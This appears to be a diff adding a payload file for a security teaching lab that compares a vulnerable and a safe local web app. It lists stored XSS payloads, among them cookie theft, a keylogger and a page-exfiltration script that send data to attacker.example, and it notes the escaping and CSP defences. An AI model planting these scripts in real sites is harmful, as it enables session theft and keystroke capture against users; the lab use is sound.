@@ -1,0 +1,46 @@
+# ===========================================================================
+# Payload: Stored XSS
+# Target:  VULNERABLE version — http://localhost:5001
+# Route:   POST /student/dashboard (safe counterpart: /dashboard)
+# Effect:  The payload is stored in the comments table and executed in every
+#          browser that loads the dashboard while the row exists in the DB.
+# ===========================================================================
+
+# --- Step 1: Log in as any user (e.g. alice / alice123) ---
+# --- Step 2: Paste one of the following into the comment textarea and click Post ---
+
+# Basic alert POC
+<script>alert('stored-xss')</script>
+
+# Cookie theft — sends document.cookie to an attacker-controlled endpoint
+# Replace http://attacker.example with a netcat listener or requestbin URL
+<script>
+var img = new Image();
+img.src = 'http://attacker.example/steal?c=' + encodeURIComponent(document.cookie);
+</script>
+
+# Keylogger variant (captures keystrokes until navigated away)
+<script>
+document.addEventListener('keydown', function(e){
+  var img = new Image();
+  img.src = 'http://attacker.example/key?k=' + encodeURIComponent(e.key);
+});
+</script>
+
+# Session hijack via XHR (reads a page the victim is logged into)
+<script>
+fetch('/profile').then(r=>r.text()).then(d=>{
+  fetch('http://attacker.example/exfil', {method:'POST', body:d});
+});
+</script>
+
+# ===========================================================================
+# Expected result on VULNERABLE (:5001):
+#   The script tag is stored verbatim in the DB.  Every user who loads the
+#   dashboard page receives the payload and their browser executes it.
+#
+# Expected result on SAFE (:5002):
+#   Jinja autoescape applies at render time. The stored text is displayed
+#   as literal characters; it is not escaped twice.
+#   The CSP script-src 'self' header also blocks any inline script.
+# ===========================================================================
